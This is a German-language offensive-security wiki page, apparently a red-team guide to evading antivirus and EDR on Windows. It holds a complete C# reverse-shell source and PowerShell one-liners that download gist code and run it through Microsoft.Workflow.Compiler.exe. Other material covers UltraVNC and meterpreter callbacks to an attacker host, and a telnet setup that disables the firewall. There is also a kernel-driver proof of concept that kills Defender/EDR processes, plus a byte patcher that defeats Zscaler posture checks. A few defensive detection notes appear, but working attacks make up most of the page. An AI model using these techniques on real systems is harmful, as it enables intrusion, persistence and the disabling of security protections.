**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass executables, die mit einem **trusted** signing certificate signiert sind, **keinen SmartScreen**-Alarm auslösen.

Eine sehr effektive Methode, um zu verhindern, dass Ihre payloads das Mark of The Web erhalten, besteht darin, sie in irgendeine Art von Container wie eine ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **non NTFS** Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabe-Container verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Es kann jedoch auch von Sicherheitsprodukten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** des Benutzermodusprozesses so zu verändern, dass sie sofort ohne Protokollierung von Ereignissen zurückkehrt. Dies geschieht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

Mehr Informationen finden Sie unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries in den Speicher ist seit einiger Zeit bekannt und ist immer noch eine sehr gute Methode, um Ihre post-exploitation-Tools auszuführen, ohne von AV erwischt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, es gibt jedoch verschiedene Möglichkeiten, dies zu tun:

- **Fork\&Run**

Dabei wird **ein neuer Opferprozess erzeugt**, Ihr post-exploitation bösartiger Code in diesen neuen Prozess injiziert, Ihr Code ausgeführt und nach Abschluss der neue Prozess beendet. Das hat sowohl Vor- als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatsprozesses stattfindet. Das bedeutet, wenn bei unserer post-exploitation-Aktion etwas schiefgeht oder entdeckt wird, besteht eine **viel größere Chance**, dass unser **Implantat überlebt.** Der Nachteil ist, dass Sie eine **höhere Wahrscheinlichkeit** haben, durch **verhaltensbasierte Erkennungen** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und diesen vom AV scannen zu lassen, aber der Nachteil ist, dass wenn bei der Ausführung Ihrer Payload etwas schiefgeht, die **Wahrscheinlichkeit, Ihren Beacon zu verlieren**, deutlich größer ist, da dieser abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn Sie mehr über das Laden von C#-Assemblies lesen möchten, schauen Sie sich bitte diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) an.

Sie können C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code in anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff auf die **Interpreter-Umgebung, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist**, gewährt.

Durch Gewährung des Zugriffs auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share können Sie **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo gibt an: Defender scannt weiterhin die Skripte, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer ermöglicht, **das Zugriffstoken oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, sodass dessen Privilegien reduziert werden und der Prozess zwar nicht beendet wird, aber nicht die Berechtigungen besitzt, nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **verhindern, dass externe Prozesse** Handles auf die Tokens von Sicherheitsprozessen erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC zu installieren und es dann zur Übernahme und Aufrechterhaltung von Persistenz zu verwenden:
1. Downloaden Sie von https://remotedesktop.google.com/, klicken Sie auf "Set up via SSH" und klicken Sie dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führen Sie den Installer im Silent-Modus auf dem Opferrechner aus (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehen Sie zurück zur Chrome Remote Desktop-Seite und klicken Sie auf Weiter. Der Assistent wird Sie auffordern zu autorisieren; klicken Sie auf die Schaltfläche Authorize, um fortzufahren.
4. Führen Sie den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachten Sie den Parameter --pin, der es ermöglicht, die PIN festzulegen, ohne die GUI zu verwenden).


## Advanced Evasion

Evasion ist ein sehr kompliziertes Thema; manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es nahezu unmöglich, in etablierten Umgebungen völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, sich diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das Teile der Binary entfernt, bis es herausfindet, welcher Teil Defender als bösartig einstuft, und es für Sie aufteilt.\
Ein weiteres Tool, das **dasselbe macht**, ist [**avred**](https://github.com/dobin/avred) mit einem offenen Webdienst unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows 10 hatten alle Windows-Versionen einen **Telnet-Server**, den Sie (als Administrator) so installieren konnten:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sorge dafür, dass es beim Systemstart **startet** und **führe** es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet-Port ändern** (stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Herunterladen von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du willst die bin downloads, nicht das setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege ein Passwort in _VNC Password_ fest
- Lege ein Passwort in _View-Only Password_ fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es bereit ist, eine reverse **VNC connection** abzufangen. Dann, auf dem **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um Stealth zu wahren, dürfen Sie einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png)
- Führe `winvnc -h` nicht aus, sonst erscheint ein [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Im Inneren von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte jetzt den Lister mit `msfconsole -r file.rc` und **führe** die **xml payload** mit folgendem Befehl aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere sie mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Verwendung von Python für build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Key take-aways
1. **Signed driver**: Die auf die Festplatte gelieferte Datei ist `ServiceMouse.sys`, aber die Binärdatei ist der rechtmäßig signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Weil der Treiber eine gültige Microsoft-Signatur trägt, wird er geladen, selbst wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess per PID beenden (wird benutzt, um Defender/EDR-Dienste zu killen) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Dienst entfernen |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, diese terminieren oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmaßnahmen.

Detection / Mitigation
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und alarmieren Sie, wenn ein Treiber aus einem für alle schreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** führt device-posture-Regeln lokal aus und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei schwache Designentscheidungen machen eine vollständige Umgehung möglich:

1. Die Posture-Bewertung erfolgt **vollständig client-seitig** (es wird nur ein Boolean an den Server gesendet).  
2. Interne RPC-Endpunkte validieren nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als compliant gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | Durch NOPs entfernt ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurden:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Unsigned oder modifizierte Binaries können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL) zur Manipulation von AV/EDR mit LOLBINs

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich- oder höherstufige geschützte Prozesse sich gegenseitig manipulieren können. Offensiv: Wenn du legitim ein PPL-fähiges Binary starten und dessen Argumente kontrollieren kannst, kannst du harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, von PPL gestützte write-Primitive gegen geschützte Verzeichnisse verwandeln, die von AV/EDR verwendet werden.

Was bewirkt, dass ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags erstellt werden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ein kompatibler Protection-Level muss angefordert werden, der zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen beim Erstellen zum Fehler.

Siehe auch eine ausführlichere Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt den Protection-Level und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Nutzungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte Systemdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwenden Sie 8.3-Kurzpfade, um in normalerweise geschützte Verzeichnisse zu zeigen.

8.3-Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Starten Sie das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergeben Sie das ClipUp-Logpfad-Argument, um eine Datei in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwenden Sie gegebenenfalls 8.3-Kurzpfade.
3) Falls die Ziel-Binärdatei während des Betriebs normalerweise vom AV geöffnet/gesperrt ist (z. B. MsMpEng.exe), planen Sie den Schreibvorgang beim Boot, bevor der AV startet, indem Sie einen Autostart-Service installieren, der verlässlich früher läuft. Validieren Sie die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der PPL-unterstützte Schreibvorgang bevor der AV seine Binärdateien sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Anmerkungen und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, nicht außerhalb der Platzierung kontrollieren; das Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokalen Administrator/SYSTEM, um einen Service zu installieren/zu starten und ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Dateisperren.

Erkennungen
- Prozess-Erstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, besonders wenn der Parent von nicht-standard Launchern stammt, rund um den Boot.
- Neue Services, konfiguriert zum Auto-Start von verdächtigen binaries und die konsequent vor Defender/AV starten. Untersuchen Sie Service-Erstellung/-Modifikation vor Defender-Startup-Fehlern.
- File integrity monitoring auf Defender binaries/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: Achten Sie auf Prozesse, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und anomale PPL-Level-Verwendung durch non-AV binaries.

Gegenmaßnahmen
- WDAC/Code Integrity: einschränken, welche signed binaries als PPL laufen dürfen und unter welchen Parents; ClipUp-Aufrufe außerhalb legitimer Kontexte blockieren.
- Service-Hygiene: Beschränken der Erstellung/Änderung von Auto-Start-Services und Überwachen von Startreihenfolge-Manipulation.
- Sicherstellen, dass Defender tamper protection und early-launch protections aktiviert sind; Startup-Fehler untersuchen, die auf Binary-Korruption hindeuten.
- Erwägen, die 8.3 short-name generation auf Volumes, die security tooling hosten, zu deaktivieren, sofern mit Ihrer Umgebung kompatibel (gründlich testen).

Referenzen für PPL und Tools
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Voraussetzungen
- Lokaler Administrator (benötigt, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit zu rebooten oder die Defender-Plattform-Neuauswahl auszulösen (Service-Neustart beim Boot)
- Nur eingebaute Tools erforderlich (mklink)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber die Plattform-Auswahl vertraut Verzeichnis-Einträgen und wählt die lexikographisch höchste Version, ohne zu validieren, dass das Ziel zu einem geschützten/vertrauten Pfad aufgelöst wird.

Schritt-für-Schritt (Beispiel)
1) Bereiten Sie einen beschreibbaren Klon des aktuellen Platform-Ordners vor, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
